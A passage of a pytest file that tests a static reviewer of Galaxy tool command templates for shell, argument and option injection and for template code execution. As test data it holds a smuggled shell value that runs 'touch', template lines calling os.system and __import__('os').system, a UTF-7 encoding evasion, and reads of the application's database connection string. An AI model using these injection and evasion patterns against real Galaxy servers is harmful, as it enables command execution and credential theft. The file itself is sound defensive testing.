def test_default_of_a_lambda_argument_is_read(tmp_path, command):
    compile_template(command)
    assert ("shell-injection", "high") in rules(review(tmp_path, command))


@pytest.mark.parametrize(
    "command",
    [
        "#set $y = 'safe'\n#silent [(y := str($free)) for _ in [1]]\ntool '$y'",
        "#set $acc = []\n#silent [acc.append(str($free)) for _x in [1]]\ntool '${''.join($acc)}'",
        "#set $acc = []\n#silent list(acc.append(str($free)) for _x in [1])\ntool '${''.join($acc)}'",
        "#set $acc = []\n#set $f = lambda: acc.append(str($free))\n#silent $f()\ntool '${''.join($acc)}'",
        "#set $d = {}\n#silent [d.update({'k': str($free)}) for _x in [1]]\ntool '${d['k']}'",
        "#set $d = {}\n#silent [d.update(k=str($free)) for _x in [1]]\ntool '${d['k']}'",
        "#set $d = {}\n#silent $d.update(k=str($free))\ntool '${d['k']}'",
        "#set $l = ['safe']\n#silent [l.__iadd__([str($free)]) for _ in [1]]\ntool '${l[1]}'",
        "#set $l = ['safe']\n#silent $l.__iadd__([str($free)])\ntool '${l[1]}'",
        "#set $acc = []\n#silent list(map(acc.append, [str($free)]))\ntool '${''.join($acc)}'",
        "tool '${''.join(['a'].__iadd__([str($free)]))}'",
        "#set $s = set()\n#silent $s.symmetric_difference_update({str($free)})\ntool '${''.join($s)}'",
        "#set $s = set()\n#silent [s.__ixor__({str($free)}) for _ in [1]]\ntool '${''.join($s)}'",
        "#import collections\n#set $q = collections.deque()\n#silent $q.extendleft([str($free)])\ntool '${''.join($q)}'",
        # Reordered, the list's items have no known position.
        "#set $l = ['safe', str($free)]\n#silent $l.reverse()\ntool '${l[0]}'",
        "#set $l = ['safe', str($free)]\n#silent l.pop(0)\ntool '${l[0]}'",
    ],
)
def test_changes_a_lambda_or_comprehension_makes_to_locals_are_kept(tmp_path, command):
    compile_template(command)
    assert ("shell-injection", "high") in rules(review(tmp_path, command))


@pytest.mark.parametrize(
    "command",
    [
        # The comprehension may not run: the name stays unbound and is the parameter.
        "#silent [(free := 'safe') for _ in []]\ntool '$free'",
        "#silent list((free := 'safe') for _ in [])\ntool '$free'",
        "#set global $g = $free\n#silent [(g := 'safe') for _ in []]\ntool '$g'",
        "#if $word\n#silent [(free := 'safe') for _ in []]\n#end if\ntool '$free'",
        # A walrus in a lambda binds in the lambda's frame.
        "#silent (lambda: (free := 'safe'))\ntool '$free'",
        "#silent (lambda: (free := 'safe'))()\ntool '$free'",
        "#silent (lambda: [(free := 'safe') for _ in [1]])()\ntool '$free'",
    ],
)
def test_names_a_lambda_or_comprehension_may_leave_unbound_are_parameters(tmp_path, command):
    compile_template(command)
    assert ("shell-injection", "high") in rules(review(tmp_path, command))


@pytest.mark.parametrize(
    "command",
    [
        # A comprehension's target stays its own.
        "#set $x = 'safe'\n#silent [x for x in [$free]]\ntool '$x'",
        "#set $x = 'safe'\n#silent [(x := 'ok') for _ in [1]]\ntool '$x'",
        "#set $acc = []\n#silent [acc.append('ok') for _x in [$free]]\ntool '${''.join($acc)}'",
    ],
)
def test_names_a_lambda_or_comprehension_binds_do_not_leak(tmp_path, command):
    compile_template(command)
    assert rules(review(tmp_path, command)) == set()


@pytest.mark.parametrize(
    "command",
    [
        "#if $word == 'x'\n#set $free = 'safe'\n#end if\ntool '$free'",
        "#if $word == 'x'\n#pass\n#else\n#set $free = 'safe'\n#end if\ntool '$free'",
        "#for $r in $rows\n#set $free = 'safe'\n#end for\ntool '$free'",
        "#for $free in ['safe']\nx\n#end for\ntool '$free'",
        # A second loop over the name may not run either.
        "#for $free in ['safe']\nx\n#end for\n#for $free in ['ok']\nx\n#end for\ntool '$free'",
        "#for $free in ['safe']\nx\n#end for\n#for $r in $rows\n#set $free = 'ok'\n#end for\ntool '$free'",
        "#while $word == 'x'\n#set $free = 'safe'\n#break\n#end while\ntool '$free'",
        "#try\n#set $n = int($word)\n#set $free = 'safe'\n#except\n#pass\n#end try\ntool '$free'",
        "#def show()\n#if $word == 'x'\n#set $free = 'safe'\n#end if\n$free#slurp\n#end def\ntool '$show()'",
        # The review does not relate two tests of the same value.
        "#if $word == 'x'\n#set $free = 'safe'\n#end if\n#if $word == 'x'\ntool '$free'\n#end if",
    ],
)
def test_set_that_may_not_have_run_leaves_the_parameter_of_its_name(tmp_path, command):
    # A #set that did not run leaves its local unbound, and Cheetah's lookup then reads the namespace.
    compile_template(command)
    assert ("shell-injection", "high") in rules(review(tmp_path, command))


@pytest.mark.parametrize(
    "command",
    [
        "#if $word == 'x'\n#set $free = 'safe'\n#else\n#set $free = 'ok'\n#end if\ntool '$free'",
        "#set $free = 'safe'\n#if $word == 'x'\n#set $free = 'ok'\n#end if\ntool '$free'",
        "#if $word == 'x'\n#set $free = 'safe'\n#else\n#stop\n#end if\ntool '$free'",
        "#for $r in $rows\n#set $free = 'safe'\n#end for\n#set $free = 'ok'\ntool '$free'",
        # In the body of a loop its target is bound, though an earlier loop may have left it unbound.
        "#for $label in ['a']\nx\n#end for\n#for $label in ['safe']\ntool '$label'\n#end for",
    ],
)
def test_set_that_ran_on_every_path_is_the_local(tmp_path, command):
    compile_template(command)
    assert rules(review(tmp_path, command)) == set()


MAYBE_UNSET = """#if $word == 'x'
#set $NAME = 'safe'
#end if
tool '$NAME' '${''.join($NAME for _x in [1])}'"""


@pytest.mark.parametrize(
    "template_job_parameters,keeps_undeclared,read",
    [
        # Galaxy passes a regular tool's inputs and its template job parameters only.
        (frozenset({"dbkey", "chromInfo"}), False, False),
        (frozenset({"zzz"}), False, True),
        # A data source tool keeps all its job parameters; a review that does not know the tool assumes so too.
        (frozenset({"dbkey"}), True, True),
        (None, False, True),
    ],
)
def test_unset_local_reads_a_job_parameter_only_where_one_reaches_the_template(
    tmp_path, template_job_parameters, keeps_undeclared, read
):
    path = os.path.join(tmp_path, "tool.xml")
    with open(path, "w") as fh:
        fh.write(
            f"""<tool id="t" name="t" version="1" profile="24.2"><command><![CDATA[{MAYBE_UNSET.replace("NAME", "zzz")}]]></command>
  <inputs>{INPUTS}</inputs><outputs><data name="out" format="txt"/></outputs></tool>"""
        )
    report = review_tool_source(
        get_tool_source(path),
        template_job_parameters=template_job_parameters,
        keeps_undeclared_job_parameters=keeps_undeclared,
    )
    assert any(ref.key == "zzz" for f in report.findings for ref in f.refs) is read


@pytest.mark.parametrize(
    "command",
    [
        # Every path and #def shares one #set global store.
        "#if $word == 'x'\n#set global $g = $free\n#else\n#set global $g = 'safe'\n#end if\ntool '$g'",
        # Where the #set global did not run, the name is the parameter.
        "#if $word == 'x'\n#set global $free = 'safe'\n#end if\ntool '$free'",
        "#for $r in $rows\n#set global $free = 'safe'\n#end for\ntool '$free'",
        "#if $word == 'x'\n#set global $free = 'safe'\n#end if\ntool '$getVar(\"free\")'",
        "#def show()\n$free#slurp\n#end def\ntool '$show()'\n#set global $free = 'safe'",
    ],
)
def test_set_global_that_may_not_have_run_leaves_the_parameter_of_its_name(tmp_path, command):
    compile_template(command)
    assert ("shell-injection", "high") in rules(review(tmp_path, command))


@pytest.mark.parametrize(
    "command",
    [
        "#set global $free = 'safe'\ntool '$free'",
        "#set global $free = 'safe'\n#def show()\n$free#slurp\n#end def\ntool '$show()'",
        "#if $word == 'x'\n#set global $free = 'safe'\n#else\n#set global $free = 'ok'\n#end if\ntool '$free'",
    ],
)
def test_set_global_that_ran_on_every_path_is_its_value(tmp_path, command):
    compile_template(command)
    assert rules(review(tmp_path, command)) == set()


@pytest.mark.parametrize(
    "template_job_parameters,keeps_undeclared,read",
    [(frozenset({"dbkey"}), False, False), (frozenset({"foo"}), False, True), (frozenset(), True, True)],
)
def test_get_var_of_a_name_no_input_has_reads_the_job_parameter_that_reaches_the_template(
    tmp_path, template_job_parameters, keeps_undeclared, read
):
    path = os.path.join(tmp_path, "tool.xml")
    with open(path, "w") as fh:
        fh.write("""<tool id="t" name="t" version="1" profile="24.2"><options sanitize="false"/>
  <command><![CDATA[tool '$getVar("foo", "")']]></command>
  <inputs><param name="word" type="text"/></inputs><outputs><data name="out" format="txt"/></outputs></tool>""")
    report = review_tool_source(
        get_tool_source(path),
        template_job_parameters=template_job_parameters,
        keeps_undeclared_job_parameters=keeps_undeclared,
    )
    assert (("shell-injection", "high") in rules(report)) is read


@pytest.mark.parametrize(
    "tool_type,check_values", [("data_source", ""), ("data_source_async", ""), ("", ' check_values="false"')]
)
def test_data_source_tools_keep_their_job_parameters(tmp_path, tool_type, check_values):
    path = os.path.join(tmp_path, "tool.xml")
    attrs = f' tool_type="{tool_type}"' if tool_type else ""
    with open(path, "w") as fh:
        fh.write(
            f"""<tool id="t" name="t" version="1" profile="24.2"{attrs}><options sanitize="false"/>
  <command><![CDATA[tool '$__galaxy_url__']]></command>
  <inputs{check_values}><param name="word" type="text"/></inputs><outputs><data name="out" format="txt"/></outputs></tool>"""
        )
    assert ("shell-injection", "high") in rules(review_tool_source(get_tool_source(path)))


@pytest.mark.parametrize(
    "command,expected",
    [
        # The default sanitizer runs, not the param's letters-only one.
        ("tool $letters", {("argument-injection", "medium"), ("option-injection", "low")}),
        ("tool '${letters.strip()}'", {("option-injection", "low")}),
        # A plain string has no `.value`: the template fails there.
        ("tool '$letters.value'", set()),
        # SafeStringWrapper keeps the value as submitted.
        ("tool '$letters.unsanitized'", {("shell-injection", "high"), ("option-injection", "low")}),
        # A baseurl param is the request's value, not the tool's.
        ("tool $url", {("argument-injection", "medium"), ("option-injection", "low")}),
    ],
)
def test_inputs_without_parameter_wrappers_are_default_sanitized_strings(tmp_path, command, expected):
    path = os.path.join(tmp_path, "tool.xml")
    with open(path, "w") as fh:
        fh.write(f"""<tool id="t" name="t" version="1" profile="24.2">
  <command><![CDATA[{command}]]></command>
  <inputs check_values="false"><param name="letters" type="text">
    <sanitizer><valid initial="string.ascii_letters"/></sanitizer></param>
    <param name="url" type="baseurl" value="/tool_runner"/></inputs>
  <outputs><data name="out" format="txt"/></outputs></tool>""")
    assert rules(review_tool_source(get_tool_source(path))) == expected


@pytest.mark.parametrize(
    "name", ["__galaxy_url__", "__history_id__", "__datatypes_config__", "GALAXY_DATATYPES_CONF_FILE", "__job_resource"]
)
@pytest.mark.parametrize(
    "check_values,keeps,read", [("", None, False), (' check_values="false"', None, True), ("", True, True)]
)
def test_galaxy_names_a_job_parameter_replaces_in_a_tool_that_keeps_them_all(tmp_path, name, check_values, keeps, read):
    path = os.path.join(tmp_path, "tool.xml")
    with open(path, "w") as fh:
        fh.write(
            f"""<tool id="t" name="t" version="1" profile="24.2"><options sanitize="false"/>
  <command><![CDATA[tool '${name}' && cat ${{open($__tool_directory__ + '/x').read()}} ${{open(${name} + '/x').read()}}]]></command>
  <inputs{check_values}><param name="word" type="text"/></inputs><outputs><data name="out" format="txt"/></outputs></tool>"""
        )
    report = review_tool_source(get_tool_source(path), keeps_undeclared_job_parameters=keeps)
    assert (("shell-injection", "high") in rules(report)) is read
    # A file under a directory of Galaxy is not a read of the job's data; one the job names is.
    assert any("content of a file" in (f.source or "") for f in report.findings) is read


@pytest.mark.parametrize(
    "command,expected",
    [
        ("#block b\ntool '$free'\n#end block b", True),
        ("#block b\n#set $free = 'safe'\ntool '${''.join($free for _x in [1])}'\n#end block b", True),
        ("#block outer\n#block inner\ntool '$free'\n#end block inner\n#end block outer", True),
        ("#block b\ntool '$word'\n#end block b", False),
    ],
)
def test_text_of_a_block_is_read_where_the_block_is(tmp_path, command, expected):
    compile_template(command)
    assert (("shell-injection", "high") in rules(review(tmp_path, command))) is expected


@pytest.mark.parametrize(
    "command,expected",
    [
        ("tool '${''.join(map(lambda _x: $free, [1]))}'", True),
        ("#set $f = lambda _x: str($free)\ntool '${''.join(map(f, [1]))}'", True),
        ("tool '${''.join(map(lambda x: x, [$free]))}'", True),
        ("tool '${''.join(map(str, [$word]))}'", False),
    ],
)
def test_map_gives_what_its_function_returns(tmp_path, command, expected):
    compile_template(command)
    assert (("shell-injection", "high") in rules(review(tmp_path, command))) is expected


RAW = "a';touch harm-marker;'"


def rendered_raw(command: str) -> bool:
    """Whether Cheetah renders the raw value of `$free` into the command."""
    namespace = {"free": RAW, "word": "word", "text": "text"}
    return RAW in str(Template(command, searchList=[namespace]))


LAMBDA_NOT_FOLLOWED = "command: what a lambda does was not analysed"


@pytest.mark.parametrize(
    "command",
    [
        # The body reads a local the template sets again before the call.
        "#set $s = 'safe'\n#set $f = lambda: s\n#set $s = str($free)\ntool '${f()}'",
        "#set $s = 'safe'\n#set $f = lambda: (lambda: s)()\n#set $s = str($free)\ntool '${f()}'",
        "#set $s = 'safe'\n#set $f = lambda: [s for _x in [1]][0]\n#set $s = str($free)\ntool '${f()}'",
        "#set $s = 'safe'\n#set $f = lambda: (lambda x=s: x)()\n#set $s = str($free)\ntool '${f()}'",
        "#set global $g = 'safe'\n#set $f = lambda: $g\n#set global $g = str($free)\ntool '${f()}'",
        "#set global $g = 'safe'\n#set $f = lambda: $getVar('g')\n#set global $g = str($free)\ntool '${f()}'",
        (
            "#def h\n#return $g\n#end def\n#set global $g = 'safe'\n#set $f = lambda: $h\n"
            "#set global $g = str($free)\ntool '${f()}'"
        ),
        # It changes a list of the template's with what the call passes.
        "#set $acc = []\n#set $f = lambda x: acc.append(x)\n#silent $f(str($free))\ntool '${''.join($acc)}'",
        "#set $acc = []\n#silent list(map(lambda x: acc.append(x), [str($free)]))\ntool '${''.join($acc)}'",
        # A local passed in under another name.
        "#set $acc = []\n#set $f = lambda a: a.append(str($free))\n#silent $f($acc)\ntool '${''.join($acc)}'",
        "#set $acc = []\n#set $f = lambda a: a.__iadd__([str($free)])\n#silent $f($acc)\ntool '${''.join($acc)}'",
        "#set $acc = []\n#set $f = lambda x, a=acc: a.extend([x])\n#silent $f(str($free))\ntool '${''.join($acc)}'",
        (
            "#set $acc = []\n#set $f = lambda a: [b.append(str($free)) for b in [a]]\n#silent $f($acc)\n"
            "tool '${''.join($acc)}'"
        ),
        "#set global $acc = []\n#set $f = lambda: $acc.append(str($free))\n#silent $f()\ntool '${''.join($acc)}'",
        (
            "#set $s = set()\n#set $f = lambda a, v: a.symmetric_difference_update({v})\n#silent $f($s, str($free))\n"
            "tool '${''.join($s)}'"
        ),
        "#set $d = {'k': 'safe'}\n#set $f = lambda: [1 for d['k'] in [str($free)]]\n#silent $f()\ntool '${d['k']}'",
        # `$g` of a nested lambda is a lookup: only its own frame holds the outer argument `g`.
        "#set global $g = 'safe'\n#set $f = lambda g: (lambda: $g)()\n#set global $g = str($free)\ntool '${f('safe')}'",
        "#def h\n#return str($free)\n#end def\n#set $f = lambda h: (lambda: $h)()\ntool '${f('safe')}'",
        # Attributes of the frame's locals dict come before the namespace.
        "#set global $g = 'safe'\n#set $f = lambda: $get('SL')[0]['g']\n#set global $g = str($free)\ntool '${f()}'",
        # Reordering a list moves a value to a position the analysis read as another.
        "#set $acc = ['safe', str($free)]\n#set $f = lambda a: a.reverse()\n#silent $f($acc)\ntool '${acc[0]}'",
    ],
)
def test_lambda_the_review_does_not_follow_is_code(tmp_path, command):
    assert rendered_raw(command)
    report = review(tmp_path, command)
    assert ("template-lambda", "high") in rules(report, "capability")
    assert LAMBDA_NOT_FOLLOWED in report.unanalyzed
    assert report.unchecked_locations == {"command": "parts of it were not analysed"}


@pytest.mark.parametrize(
    "command",
    [
        "#set $f = lambda: (y := 1)\ntool '${f()}'",
        "#set $f = lambda x: $x.__class__\ntool '${f(1)}'",
        "#set $f = lambda x: x._private\ntool '${f(1)}'",
        "#set $f = lambda x: vars()\ntool '${f(1)}'",
        "#set $f = lambda x: getattr(x, 'real')\ntool '${f(1)}'",
        "#set $f = lambda x: $getattr(x, 'real')\ntool '${f(1)}'",
        "#set $f = lambda x: type(x)\ntool '${f(1)}'",
        "#set $f = lambda x: $self\ntool '${f(1)}'",
        "#set $f = lambda x: (yield x)\ntool '${f(1)}'",
        # A local, an import or any import of a module can rebind a builtin.
        "#set $str = 'x'\n#set $f = lambda x: str(x)\ntool '${f(1)}'",
        "#from os.path import *\n#set $f = lambda x: str(x)\ntool '${f(1)}'",
        "#from json import dumps as str\n#set $f = lambda x: str(x)\ntool '${f(1)}'",
        "#def h($n)\n#set $f = lambda x: x + n\n${f(1)}#slurp\n#end def\ntool '$h(1)'",
        "#attr $f = lambda x: x.append(1)\ntool",
    ],
)
def test_lambda_that_reaches_more_than_its_arguments_is_code(tmp_path, command):
    compile_template(command)
    report = review(tmp_path, command)
    assert ("template-lambda", "high") in rules(report, "capability")
    assert LAMBDA_NOT_FOLLOWED in report.unanalyzed


@pytest.mark.parametrize(
    "command,expected",
    [
        # alerax
        (
            (
                "#set $trees = sorted($flat, key=lambda x: str(x.element_identifier))\n#for $t in $trees\n"
                "tool '$t.element_identifier'\n#end for"
            ),
            {("shell-injection", "high"), ("option-injection", "low")},
        ),
        # vcflib vcfselectsamples, samtools slice_bam
        (
            "tool ${ ' '.join( map( lambda x:'\"%s\"' % ( x ), str($text ).split(\",\") ) ) }",
            {("argument-injection", "medium"), ("option-injection", "low")},
        ),
        # bowtie2 and the read group macros
        (
            (
                "#import itertools\n#set $common_prefix = ''.join([c[0] for c in itertools.takewhile(lambda x: all(x[0]"
                " == y for y in x), zip(*[$word, $text]))])\ntool '$common_prefix'"
            ),
            {("option-injection", "low")},
        ),
        # make_EAR
        (
            (
                "#import json\n#set $yq = lambda value: json.dumps(value, ensure_ascii=False)\n"
                "tool: $yq(str($text).strip())"
            ),
            {("argument-injection", "medium"), ("option-injection", "low")},
        ),
        (
            "#set $label = 'sample'\n#set $quoted = lambda: \"'%s'\" % $label.value\necho ${quoted()}",
            {("shell-injection", "high"), ("option-injection", "low")},
        ),
        ("#set $f = lambda v: $v\ntool '${f('safe')}'", set()),
        ("#set $s = 'safe'\n#set $f = lambda x=$s: $x\ntool '${f()}'", set()),
        ("#set $acc = []\n#set $f = lambda x=acc: len(x)\ntool '${f()}'", set()),
        ("#set $f = lambda x: (lambda y: x + y)(1)\ntool '${f(1)}'", set()),
        ("#set $f = lambda x: [y.strip() for y in x.split(',') if y]\ntool '${f($word)}'", set()),
        ("#set $f = lambda x: $input\ntool '${f(1)}'", set()),
        ("#set global $g = lambda x: str(x)\ntool '${g($word)}'", set()),
    ],
)
def test_pure_lambda_is_read_as_a_function_of_its_arguments(tmp_path, command, expected):
    compile_template(command)
    report = review(tmp_path, command)
    assert not any(f.rule == "template-lambda" for f in report.findings)
    assert report.unanalyzed == []
    assert rules(report) == expected


def test_lambda_reading_the_application_object_is_flagged_for_that_alone(tmp_path):
    # crossmap
    command = (
        'tool "${filter(lambda x: str( x[1] ) == str($word), '
        "$__app__.tool_data_tables['liftOver'].get_fields())[0][2] }\""
    )
    report = review(tmp_path, command)
    assert rules(report, "capability") == {("template-app-access", "high")}
    assert report.unanalyzed == []


@pytest.mark.parametrize(
    "command",
    [
        "#import json\n#set $yq = lambda value: json.dumps(value, ensure_ascii=False)\ntool '${yq($free)}'",
        "#set $q = lambda value: \"'%s'\" % value\ntool ${q($free)}",
        "tool ${ ' '.join( map( lambda x:'\"%s\"' % ( x ), str($free ).split(\",\") ) ) }",
        "#set $l = sorted([$free], key=lambda x: str(x))\ntool '${l[0]}'",
        "#import itertools\n#set $l = ''.join(itertools.takewhile(lambda x: True, str($free)))\ntool '$l'",
        "#set $l = list(filter(lambda x: str(x), [$free]))\ntool '${l[0]}'",
        "#set $f = lambda p: ' '.join(map(lambda x: x, str(p).split(',')))\ntool '${f($free)}'",
        "#set $fs = [lambda x: x]\ntool '${fs[0]($free)}'",
        # A pure lambda passed on carries what it gives.
        "#set $h = lambda: $free\n#set $g = lambda f: f()\ntool '${g(h)}'",
        "#set $f = lambda: lambda: $free\ntool '${f()()}'",
        "#set $d = {'a': lambda: $free}\ntool '${d['a']()}'",
        "#import collections\ntool '${collections.defaultdict(lambda: $free)['k']}'",
        "tool '${next(iter(lambda: $free, None))}'",
        "#import re\ntool '${re.sub('x', lambda m: $free, 'x')}'",
        "#import json\ntool '${json.dumps({1}, default=lambda o: $free)}'",
        "tool '${ {}.get('k', lambda: $free)() }'",
        "#import re\ntool '${re.sub('x', str($free).format, 'x')}'",
    ],
)
def test_values_pass_through_a_pure_lambda(tmp_path, command):
    assert rendered_raw(command)
    report = review(tmp_path, command)
    assert ("shell-injection", "high") in rules(report)
    assert report.unanalyzed == []


@pytest.mark.parametrize(
    "command,note",
    [
        # A method that changes a list, passed on as a value.
        ("#set $acc = []\n#silent list(filter(acc.append, [str($free)]))", "`.append` is passed on as a value"),
        ("#set $acc = []\n#silent sorted([str($free)], key=acc.append)", "`.append` is passed on as a value"),
        (
            "#import itertools\n#set $acc = []\n#silent list(itertools.starmap(acc.append, [(str($free),)]))",
            "`.append` is passed on as a value",
        ),
        (
            "#set $acc = []\n#set $f = lambda x, m=acc.append: m(x)\n#silent $f(str($free))",
            "`.append` is passed on as a value",
        ),
        (
            "#set $acc = []\n#set $f = lambda x, m: list(map(m, [x]))\n#silent $f(str($free), acc.append)",
            "`.append` is passed on as a value",
        ),
        ("#set $acc = [[]]\n#silent list(map(acc[0].append, [str($free)]))", "`.append` is passed on as a value"),
        # Called on a type, with the list as its argument.
        (
            "#set $acc = []\n#silent list.append($acc, str($free))",
            "`.append` is called on `list`, which is not a local of the template",
        ),
        (
            "#set $acc = []\n#silent list(map(list.append, [$acc], [str($free)]))",
            "`.append` is called on `list`, which is not a local of the template",
        ),
        # Called on a name a comprehension binds: the local under another name.
        (
            "#set $acc = []\n#silent [a.append(str($free)) for a in [acc]]",
            "`.append` is called on `a`, which is not a local of the template",
        ),
        (
            "#set $acc = []\n#silent [$a.append(str($free)) for $a in [$acc]]",
            "`.append` is called on `$a`, which is not a local of the template",
        ),
        ("#set $d = {'k': 'safe'}\n#silent [None for d['k'] in [str($free)]]", "a comprehension stores into `d['k']`"),
        # Called on a value that is the list itself.
        (
            "#set $acc = []\n#silent type(acc).append(acc, str($free))",
            "`.append` is called on `type(acc)`, which is not a local of the template",
        ),
        (
            "#set $acc = []\n#silent (acc if True else []).append(str($free))",
            "`.append` is called on `acc if True else []`, which is not a local of the template",
        ),
        (
            "#import operator\n#set $acc = []\n#silent operator.iadd(acc, [str($free)])",
            "`operator.iadd` changes its argument in place",
        ),
    ],
)
def test_changes_in_place_the_review_does_not_follow(tmp_path, command, note):
    command += "\ntool '${acc[0]}'" if "acc" in command else "\ntool '${d['k']}'"
    assert rendered_raw(command)
    report = review(tmp_path, command)
    assert f"command: {note}, what it changes was not followed" in report.unanalyzed
    assert report.unchecked_locations == {"command": "parts of it were not analysed"}


@pytest.mark.parametrize(
    "command",
    [
        "#set $acc = []\n#silent $acc.append(str($free))\ntool '${acc[0]}'",
        "#set $acc = []\n#silent acc.append(str($free))\ntool '${acc[0]}'",
        "#set $acc = []\n#silent list(map(acc.append, [str($free)]))\ntool '${acc[0]}'",
        "#set $acc = []\n#silent [acc.append(str(x)) for x in [$free]]\ntool '${acc[0]}'",
        "#set $d = {}\n#set $d['k'] = []\n#silent $d['k'].append('x')\ntool '${d['k'][0]}'",
        "#def h($acc)\n#silent $acc.append('x')\n#end def\ntool",
        "#set $acc = []\n#silent $map(acc.append, [str($free)])\ntool '${acc[0]}'",
        "#set $d = {}\n#silent $d.setdefault('k', []).append('x')\ntool",
    ],
)
def test_changes_in_place_the_review_follows(tmp_path, command):
    assert not review(tmp_path, command).unanalyzed


GROUP = """
<conditional name="c">
  <param name="sel" type="select"><option value="a">a</option></param>
  <when value="a"><param name="t" type="text"><sanitizer sanitize="false"/></param></when>
</conditional>
"""


@pytest.mark.parametrize(
    "command",
    [
        "#for $v in $c.values()\ntool '$v'\n#end for",
        "#for $k, $v in $c.items()\ntool '$v'\n#end for",
        "tool '${c.get('t')}'",
        "#set $k = 't'\ntool '${c.get($k)}'",
        "tool '${c.get('none', $c.t)}'",
        "tool '${ {}.get('x', $c.t) }'",
    ],
)
def test_parameters_read_through_the_dict_of_a_group(tmp_path, command):
    assert ("shell-injection", "high") in rules(review(tmp_path, command, inputs=GROUP))


@pytest.mark.parametrize(
    "command",
    [
        "#silent $c.update({'sel': $free})\ntool '$c.sel'",
        "#silent $c.__setitem__('sel', $free)\ntool '$c.sel'",
        "#silent $c.setdefault('x', $free)\ntool '$c.x'",
        "#set $d = $c.copy()\ntool '$d.t'",
        "tool '${c.pop('t')}'",
    ],
)
def test_a_group_changed_or_copied_is_not_followed(tmp_path, command):
    report = review(tmp_path, command, inputs=INPUTS + GROUP)
    assert any("of a conditional or section, its values were not followed" in note for note in report.unanalyzed)


def test_a_group_looked_up_by_a_literal_key_is_that_parameter(tmp_path):
    assert rules(review(tmp_path, "tool '${c.get('sel')}'", inputs=GROUP)) == set()


def test_script_read_from_standard_input_is_a_program(tmp_path):
    report = review(tmp_path, "R --vanilla < '$script'", CONFIG.format("<![CDATA[x = $text]]>"))
    assert ("configfile-injection", "high") in rules(report)


@pytest.mark.parametrize(
    "command,expected",
    [
        ("#from os import system\n#silent $system('id')\ntool", ("template-exec", "critical")),
        ("#import os as o\n#silent o.system('id')\ntool", ("template-exec", "critical")),
        ("#set $o = $os\n#silent $o.system('id')\ntool", ("template-reflection", "high")),
        # The assignment never runs, so `$eval` is still the builtin.
        ("#if False\n#set $eval = 1\n#end if\ntool ${eval('1')}", ("template-exec", "critical")),
        ("tool ${getVar('__app__').config.database_connection}", ("template-app-access", "high")),
        ("tool ${getVar('__ap' + 'p__')}", ("template-reflection", "medium")),
        # getVar drops `$` from the name.
        ("tool ${getVar('$__app__').config.database_connection}", ("template-app-access", "high")),
        ("tool ${getVar('input.unsanitized.history.name')}", ("template-model-access", "medium")),
        ("tool ${self.getVar('__app__').config.database_connection}", ("template-app-access", "high")),
        # The template object comes before the namespace.
        ("tool ${getVar('searchList')()}", ("template-reflection", "medium")),
        ("#set $searchList = 1\ntool ${getVar('searchList')()}", ("template-reflection", "medium")),
        ("tool ${getVar('_CHEETAH__searchList')}", ("template-reflection", "medium")),
        ("#def evil()\n#return 1\n#end def\ntool ${getVar('evil')}", ("template-reflection", "medium")),
        # The #set global may run after the read, or never.
        (
            "tool ${getVar('__app__.config.database_connection')}\n#if False\n#set global $__app__ = 1\n#end if",
            ("template-app-access", "high"),
        ),
        ("tool $os.system('id')", ("template-exec", "critical")),
        ("#def f($x=__import__('os').system('id'))\n#end def\ntool", ("template-exec", "critical")),
        ("#import operator\ntool ${operator.methodcaller('system', 'id')}", ("template-reflection", "high")),
    ],
)
def test_capability_evasions_found_by_review(tmp_path, command, expected):
    assert expected in rules(review(tmp_path, command), kind="capability")


@pytest.mark.parametrize(
    "command",
    [
        "#set $a = 'unsanitized'\n#set $v = getattr($input, $a).name\ntool '$v'",
        "#set $a = 'value'\n#if getattr($text, $a)\ntool\n#end if",
        "tool '${getattr($input, 'unsanitized').name}'",
        "#for $v in getattr($c, 'val' + 'ues')()\ntool '$v'\n#end for",
    ],
)
def test_getattr_is_reflection(tmp_path, command):
    report = review(tmp_path, command, inputs=INPUTS + GROUP)
    assert ("template-reflection", "high") in rules(report, kind="capability")


def test_capture_is_not_a_capability(tmp_path):
    report = review(tmp_path, "#capture v\n$count\n#end capture\ntool '$v'")
    assert rules(report, kind="capability") == set()


@pytest.mark.parametrize(
    "template",
    [
        "#i18n x=__import__('os').system('touch {marker}')\nhi\n#end i18n\n",
        '#encoding utf-7\n+ACc- if __import__("os").system("touch {marker}") else +ACc-\n',
    ],
)
def test_macro_and_encoding_directives_are_refused_not_run(tmp_path, template):
    marker = os.path.join(tmp_path, "ran")
    report = review(tmp_path, template.format(marker=marker))
    assert not os.path.exists(marker)
    assert ("template-compile-exec", "critical") in rules(report, kind="capability")


def test_utf8_encoding_directive_is_allowed(tmp_path):
    report = review(tmp_path, "#encoding utf-8\ntool '$input.element_identifier'")
    assert ("shell-injection", "high") in rules(report)


def test_template_built_to_explode_is_cut_off(tmp_path):
    helpers = "".join(f"#def h{i}($v)\n" + f"$h{i + 1}($v)" * 60 + "\n#end def\n" for i in range(5))
    report = review(tmp_path, helpers + "#def h5($v)\n$v\n#end def\ntool $h0($text)")
    assert any("too expensive" in note for note in report.unanalyzed)


CLEANED_LIST = "#import re\n#set $l = [re.sub('[^\\w.-]', '_', str($f.element_identifier)) for $f in $flat]\n"


@pytest.mark.parametrize(
    "command,expected",
    [
        # A Python list is written as ['a', 'b']: its quotes leave the cleaned names outside the shell quotes.
        (CLEANED_LIST + "tool '--names=$l'", set()),
        (
            (
                "#import re\n#set $l = [re.sub('[^\\w ]', '_', str($f.element_identifier)) for $f in $flat]\n"
                "tool '--names=$l'"
            ),
            {("argument-injection", "low")},
        ),
        ("#set $l = [str($f.element_identifier) for $f in $flat]\ntool '--names=$l'", {("shell-injection", "high")}),
        # list.reverse() returns None, which Cheetah does not write.
        ("#set $l = [str($f.element_identifier) for $f in $flat]\ntool $l.reverse()", set()),
        ("#import json\n" + CLEANED_LIST + "tool '${json.dumps($l)}'", set()),
        ("#import base64\ntool ${base64.b64encode(str($free).encode()).decode()}", set()),
        ("#set $s = str($free)\n#set $n = $s - 1\ntool $n", set()),
        # A parameter wrapper or a pathlib.Path may define the operator for text.
        ("#import pathlib\n#set $p = pathlib.Path('/tmp') / str($free)\ntool $p", {("shell-injection", "high")}),
        (
            "#import base64\ntool ${base64.encodebytes(str($free).encode()).decode()}",
            {("argument-injection", "medium")},
        ),
    ],
)
def test_values_built_in_python(tmp_path, command, expected):
    assert rules(review(tmp_path, command)) - {("option-injection", "low")} == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        # Each word must begin with a letter, digit or underscore: the extra words cannot be options.
        ("tool $dash_words", {("argument-injection", "low")}),
        ("tool $dash_anywhere", {("argument-injection", "medium")}),
    ],
)
def test_words_that_cannot_begin_with_a_dash(tmp_path, command, expected):
